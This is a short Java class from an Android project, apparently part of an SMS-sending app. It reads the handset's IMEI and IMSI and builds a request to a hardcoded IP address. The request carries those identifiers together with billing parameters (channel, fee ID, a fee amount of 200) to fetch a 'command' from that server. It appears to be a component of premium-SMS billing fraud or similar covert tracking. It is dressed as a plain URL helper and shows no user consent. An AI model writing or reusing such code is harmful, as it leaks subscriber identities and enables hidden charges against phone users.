package com.example.guangzhou_genyuan;

import android.content.Context;
import android.telephony.TelephonyManager;

import com.example.administrator.smssend.server.UrlInterface;

/**
 * Created by Administrator on 2016/6/23.
 */

public class URL implements UrlInterface
{
    private final String mImei;
    private final String mImsi;
    String cpid;
    String channelid;
    String appId;
    String appFeeId;
    String feenum;

    public URL(Context context)
    {
        TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);

        mImei = telephonyManager.getDeviceId();
        mImsi = telephonyManager.getSubscriberId();

        cpid = "103";
        channelid = "3238";
        appId = "2138";
        appFeeId = "3194";
        feenum = "200";
    }

    @Override
    public String getUrl(String ip)
    {
        return "http://120.25.220.193:8099/send/getCommand.jsp?type=1&cpid=" + cpid + "&channelId=" + channelid + "&appId=" + appId + "&appFeeId=" + appFeeId + "&feenum=" + feenum + "&imei=" + mImei + "&imsi=" + mImsi + "&netInfo=GPRS&osInfo=4.1&osModel=ZTE&iccid=89860090010671234669&clientIp=" + ip + "&extra=";
    }
}
